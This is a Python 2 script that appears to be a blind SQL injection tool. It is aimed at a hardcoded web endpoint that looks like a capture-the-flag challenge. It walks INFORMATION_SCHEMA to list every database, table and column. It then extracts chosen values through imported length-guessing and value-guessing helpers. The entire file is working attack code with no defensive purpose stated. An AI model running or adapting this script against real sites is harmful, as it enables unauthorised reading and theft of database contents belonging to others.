from imports.basic_functions import *
from imports.argument_parsing import parameter_parsing

def get_databases(base_url, status_code):
	return get_values("select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA as DB", base_url, status_code)

def get_tables(schemata, base_url, status_code):
	return get_values("select TABLE_NAME from INFORMATION_SCHEMA.TABLES as TB where TABLE_SCHEMA='%s'" % schemata, base_url, status_code)

def get_columns(table, base_url, status_code):
	return get_values("select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS as CL where TABLE_NAME='%s'" % table, base_url, status_code)

def identify_db(base_url, status_code):
	for database in get_databases(base_url, status_code):
 		print "Working with Database %s" %  database
 		for table in get_tables(database,base_url, status_code):
 			print "\tTable: %s" % table
 			for column in get_columns(table,base_url, status_code):
 				print "\t\tColumn: %s" % column


args = parameter_parsing()

# if args.base_url == None:
#	args.base_url = raw_input('Specify URL to work from')

# base_url = args.base_url
base_url = 'http://35.196.135.216/6b0a1ae546/fetch?id=3'
success_code = args.status_code

if args.identify:
	print 'Identifying Database Structure'
	identify_db(base_url, success_code)
else:
	if args.payload == None:
		args.payload = raw_input('Specify the payload to work with: ')

	if args.value_length == None:
		print "Searching Length"
		args.value_length = get_length(args.payload)
		print "Found Length: %i" % args.value_length

	print "Found value: %s" % get_value(args.payload,args.value_length,args.known_start)
